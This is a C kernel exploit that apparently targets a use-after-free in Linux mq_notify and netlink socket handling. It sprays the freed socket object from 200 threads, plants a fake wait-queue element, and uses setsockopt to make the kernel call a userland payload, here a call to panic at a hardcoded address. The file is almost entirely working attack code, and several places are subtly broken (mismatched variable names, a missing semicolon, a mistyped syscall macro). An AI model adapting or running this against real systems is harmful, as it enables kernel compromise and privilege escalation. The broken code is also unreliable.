#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>
#include <sched.h>
#include <stddef.h>
#include <sys/mman.h>
#include <stdint.h>

#define NOTIFY_COOKIE_LEN (32)
#define SOL_NETLINK (270)

#define NB_REALLOC_THREADS 200
#define KMALLOC_TARGET 1024

static volatile char g_realloc_data[KMALLOC_TARGET];
#define MAGIC_NL_PID 0xabc
#define MAGIC_NL_GROUPS 0x0

// mimic kernel offset
#define NLK_PID_OFFSET            0x258
#define NLK_GROUPS_OFFSET         0x270
#define NLK_WAIT_OFFSET           0x280
#define WQ_HEAD_TASK_LIST_OFFSET  0x8
#define WQ_ELMT_FUNC_OFFSET       0x10
#define WQ_ELMT_TASK_LIST_OFFSET  0x18

struct list_head
{
  struct list_head *next, *prev;
};

struct wait_queue_head
{
  int slock;
  struct list_head task_list;
};

typedef int (*wait_queue_func_t)(void *wait, unsigned mode, int flags, void *key);

struct wait_queue
{
  unsigned int flags;
#define WQ_FLAG_EXCLUSIVE 0x01
  void *private;
  wait_queue_func_t func;
  struct list_head task_list;
};

// wakeup common addr ffffffff8103aa22
// call primitive here ffffffff8103aa62 
// ffffffff8103f9fa T __wake_up
// ffffffff8126c6c8 t netlink_setsockopt

// ----------------------------------------------------------------------------

// avoid library wrappers
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _mmap(addr, length, prot, flags, fd, offset) syscall(__NR_mmap, addr, length, prot, flags, fd, offset)
#define _munmap(addr, length) syscall(_NR_munmap, addr, length)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(sockfd, level, optname, optval, optlen) \
  syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)
#define _getsockopt(sockfd, level, optname, optval, optlen) \
  syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)
#define _dup(oldfd) syscall(__NR_dup, oldfd)
#define _close(fd) syscall(__NR_close, fd)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)
#define _getpid() syscall(__NR_getpid)
#define _gettid() syscall(__NR_gettid)
#define _sched_setaffinity(pid, cpusetsize, mask) \
  syscall(__NR_sched_setaffinity, pid, cpusetsize, mask)
#define _open(pathname, flags) syscall(__NR_open, pathname, flags)
#define _read(fd, buf, count) syscall(__NR_read, fd, buf, count)
#define _getsockname(sockfd, addr, addrlen) syscall(__NR_getsockname, sockfd, addr, addrlen)
#define _connect(sockfd, addr, addrlen) syscall(__NR_connect, sockfd, addr, addrlen)
#define _sched_yield() syscall(__NR_sched_yield)
#define _lseek(fd, offset, whence) syscall(__NR_lseek, fd, offset, whence)

// ----------------------------------------------------------------------------

#define PRESS_KEY() \
  do { printf("[ ] press key to continue...\n"); getchar(); } while(0)

struct unblock_thread_arg
{
  int sock_fd;
  int unblock_fd;
  bool is_ready;
};


// realloc
static int migrate_to_cpu0(void)
{
  cpu_set_t set;

  CPU_ZERO(&set);
  CPU_SET(0, &set);

  if (_sched_setaffinity(_getpid(), sizeof(set), &set) == -1)
    return -1;
  return 0;
}

static bool can_use_realloc_gadget(void)
{
  int fd;
  int ret;
  bool usable = false;
  char buf[32];

  if ((fd = _open("/proc/sys/net/core/optmem_max", O_RDONLY)) < 0)
    return false;

  memset(buf, 0, sizeof(buf));
  if ((ret = _read(fd, buf, sizeof(buf))) <= 0)
    goto out;

  if (atol(buf) > 512)
    usable = true;

out:
  _close(fd);
  return usable;
}

static volatile struct wait_queue g_uland_wq_elt;
static volatile struct list_head  g_fake_next_elt;

#define PANIC_ADDR ((void*) 0xffffffff812fbddb)
#define BUILD_BUG_ON(cond) ((void)sizeof(char[1 - 2 * !!(cond)]))
static int payload(void);

static int init_realloc_data(void)
{
  struct cmsghdr *first;
  int* pid = (int*)&g_realloc_data[NLK_PID_OFFSET];
  void** groups = (void**)&g_realloc_data[NLK_GROUPS_OFFSET];
  struct wait_queue_head *nlk_wait = (struct wait_queue_head*) &g_realloc_data[NLK_WAIT_OFFSET];

  memset((void*)g_realloc_data, 'A', sizeof(g_realloc_data));

  // necessary to pass checks in __scm_send()
  first = (struct cmsghdr*) &g_realloc_data;
  first->cmsg_len = sizeof(g_realloc_data);
  first->cmsg_level = 0;
  first->cmsg_type = 1;

  // reallocation validation
  *pid = MAGIC_NL_PID;
  *groups = MAGIC_NL_GROUPS;

  BUILD_BUG_ON(offsetof(struct wait_queue_head, task_list) != WQ_HEAD_TASK_LIST_OFFSET);
  nlk_wait->slock = 0;
  nlk_wait->task_list.next = (struct list_head*)&g_uland_wq_elt.task_list;
  nlk_wait->task_list.prev = (struct list_head*)&g_uland_wq_elt.task_list;

  g_fake_next_elt.next = (struct list_head*)&g_fake_next_elt; // point to itself
  g_fake_next_elt.prev = (struct list_head*)&g_fake_next_elt; // point to itself

  BUILD_BUG_ON(offsetof(struct wait_queue, func) != WQ_ELMT_FUNC_OFFSET);
  BUILD_BUG_ON(offsetof(struct wait_queue, task_list) != WQ_ELMT_TASK_LIST_OFFSET);
  g_uland_wq_elt.flags = WQ_FLAG_EXCLUSIVE;
  g_uland_wq_elt.private = NULL;
  g_uland_wq_elt.func = (wait_queue_func_t) &payload;
  g_uland_wq_elt.task_list.next = (struct list_head*)&g_fake_next_elt;
  g_uland_wq_elt.task_list.prev = (struct list_head*)&g_fake_next_elt;

  return 0;
}

// payload
typedef void (*panic)(const char *fmt, ...);
static int payload(void)
{
    ((panic)(PANIC_ADDR))("HELLO FROM USER :)");
    return 666;
}


static bool check_realloc_succeed(int sock_fd, int magic_pid, unsigned long magic_groups)
{
  struct sockaddr_nl addr;
  size_t addr_len = sizeof(addr);

  memset(&addr, 0, sizeof(addr));
  // this will invoke "netlink_getname()" (uncontrolled read)
  if (_getsockname(sock_fd, &addr, &addr_len))
    goto fail;
  printf("[ ] test reallocation\n");
  printf("[ ] get the sock addr.nl_pid = %d\n", addr.nl_pid);
  printf("[ ] our magic_pid = %d\n", magic_pid);

  if (addr.nl_pid != magic_pid)
  {
    printf("[X] magic PID does not match!\n");
    goto fail;
  }

  if (addr.nl_groups != magic_groups)
  {
    printf("[X] groups pointer does not match!\n");
    goto fail;
  }

  return true;

fail:
  return false;
}


struct realloc_thread_arg
{
  pthread_t tid;
  int recv_fd;
  int send_fd;
  struct sockaddr_un addr;
};

static int init_unix_sockets(struct realloc_thread_arg * rta)
{
  struct timeval tv;
  static int sockcounter = 0;

  if ((rta->recvfd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0 ||
      (rta->sendfd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0)
    goto fail;

  memset(&rta->addr, 0, sizeof(rta->addr));
  rta->addr.sun_family = AF_UNIX;
  sprintf(rta->addr.sun_path + 1, "sock_%lx_%d", _gettid(), ++sock_counter);
  if (_bind(rta->recv_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
    goto fail;

  if (_connect(rta->send_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
    goto fail;

  // set the timeout value to MAX_SCHEDULE_TIMEOUT
  memset(&tv, 0, sizeof(tv));
  if (_setsockopt(rta->recv_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)))
    goto fail;

  return 0;

fail:
  return -1;
}

static volatile size_t g_nb_realloc_thread_ready = 0;
static volatile size_t g_realloc_now = 0;

static void* realloc_thread(void *arg)
{
  struct realloc_thread_arg *rta = (struct realloc_thread_arg*) arg;
  struct msghdr mhdr;
  char buf[200];

  // initialize msghdr
  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf),
  };
  memset(&mhdr, 0, sizeof(mhdr));
  mhdr.msg_iov = &iov;
  mhdr.msg_iovlen = 1;

  // make sure
  if (migrate_to_cpu0())
    goto fail;

  // make it block
  while (_sendmsg(rta->send_fd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
  {
    perror("[-] sendmsg");
    goto fail;
  }

  // use the arbitrary data now
  iov.iov_len = 16;
  mhdr.msg_control = (void*)g_realloc_data;
  mhdr.msg_controllen = sizeof(g_realloc_data);

  g_nb_realloc_thread_ready++;
  
  //block
  while (!g_realloc_now)
    ;

  // the next call should block while "reallocating"
  if (_sendmsg(rta->send_fd, &mhdr, 0) < 0)
    goto fail;

  return NULL;

fail:
  return NULL;
}

static int init_reallocation(struct realloc_thread_arg *rta, size_t nb_reallocs)
{
  int thread = 0;
  int ret = -1;

  if (!can_use_realloc_gadget())
    goto fail;

  if (init_realloc_data())
    goto fail;

  for (thread = 0; thread < nb_reallocs; ++thread)
  {
    if (init_unix_sockets(&rta[thread]))
      goto fail;

    if ((ret = pthread_create(&rta[thread].tid, NULL, realloc_thread, &rta[thread])) != 0)
      goto fail;
  }

  // wait until all threads have been created
  while (g_nb_realloc_thread_ready < nb_reallocs)
    _sched_yield();

  return 0;

fail:
  return -1;
}

// send signal
static inline __attribute__((always_inline)) void realloc_NOW(void)
{
  g_realloc_now = 1;
  _sched_yield();
  sleep(5);
}


// ----------------------------------------------------------------------------

static void* unblock_thread(void *arg)
{
  struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
  int val = 3535; //non-zero

  uta->is_ready = true; 

  // gives some time for the main thread to block
  sleep(5);
  printf("[-][unblock] closing %d fd, file-\n", uta->sock_fd);
  _close(uta->sock_fd);

  printf("[ ][unblock] unblocking now\n");
  if (_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
    perror("[X] setsockopt fail?\n");
  return NULL;
}

static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
{
  pthread_t tid;
  struct sigevent sigev;
  struct unblock_thread_arg uta;
  char sival_buffer[NOTIFY_COOKIE_LEN];

  // initialize the unblock thread arguments
  uta.sock_fd = sock_fd;
  uta.unblock_fd = unblock_fd;
  uta.is_ready = false;

  // initialize the sigevent structure
  memset(&sigev, 0, sizeof(sigev));
  sigev.sigev_notify = SIGEV_THREAD;
  sigev.sigev_value.sival_ptr = sival_buffer;
  sigev.sigev_signo = uta.sock_fd;

  printf("[ ] creating unblock thread...\n");
  if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
  {
    perror("[-] pthread_create");
    goto fail;
  }
  while (uta.is_ready == false) // spinlock until thread is created
    ;
  printf("[ ] unblocking thread has been created!\n");

  printf("[ ] get ready to block\n");
  if ((_mq_notify((mqd_t)-1, &sigev) != -1) || (errno != EBADF))
  {
    perror("[-] mq_notify");
    goto fail;
  }
  printf("[-] mq_notify succeed sockfd-\n");

  return 0;

fail:
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

/*
 * Creates a netlink socket and fills its receive buffer.
 *
 * Returns the socket file descriptor or -1 on error.
 */

static int prepare_blocking_socket(void)
{
  int sendfd;
  int recvfd;
  char buf[1024*10];
  int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = 118, // must different than zero
    .nl_groups = 0 // no groups
  };

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr mhdr = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
  };

  if ((sendfd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0 ||
      (recvfd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
    goto fail;
  printf("[+] socket created file+ sockfd+\n");

  while (_bind(recvfd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    if (errno != EADDRINUSE)
      goto fail;
    addr.nl_pid++;
  }

  printf("[+] socket bound, (nl_pid=%d), sockfd+\n", addr.nl_pid);

  // do an optimize
  _setsockopt(recvfd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size))

  printf("[ ] flooding socket\n");
  while (_sendmsg(sendfd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
    goto fail;
  printf("[ ] flood completed\n");

  _close(send_fd);

  printf("[ ] blocking socket ready\n");
  return recv_fd;

fail:
  return -1;
}

int main(void)

{
  int sockfd  = -1;
  int dumfd = -1;
  int unblockfd = -1;
  struct realloc_thread_arg rta[NB_REALLOC_THREADS];

  if (migrate_to_cpu0())
    goto fail;

  memset(rta, 0, sizeof(rta));
  if (init_reallocation(rta, NB_REALLOC_THREADS))
    goto fail;
  printf("[ ] reallocation ready!\n");

  if ((sockfd = prepare_blocking_socket()) < 0)
    goto fail;
  printf("[ ] vul socket created = %d\n", sockfd);

  if (((unblockfd = _dup(sockfd)) < 0) || ((dumfd = _dup(sockfd)) < 0))
    goto fail;
  printf("[+] file fd duplicated (unblock_fd=%d, sock_fd2=%d) file+2\n", unblockfd, dumfd);

  if (decrease_sock_refcounter(sockfd, unblockfd)<0 ||
      decrease_sock_refcounter(dumfd, unblockfd)<0)
    goto fail;
  realloc_NOW();

  if (!check_realloc_succeed(unblockfd, MAGIC_NL_PID, MAGIC_NL_GROUPS))
    goto fail;
  printf("[ ] reallocation succeed\n");

  PRESS_KEY();

  // trigger the arbitrary call primitive
  int val = 1234;
  if (_setsockopt(unblockfd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
    goto fail;

  printf("[ ] you won't see this\n");
  PRESS_KEY();

  return 0;

fail:
  printf("[X] exploit failed!\n");
  PRESS_KEY();
  return -1;
}

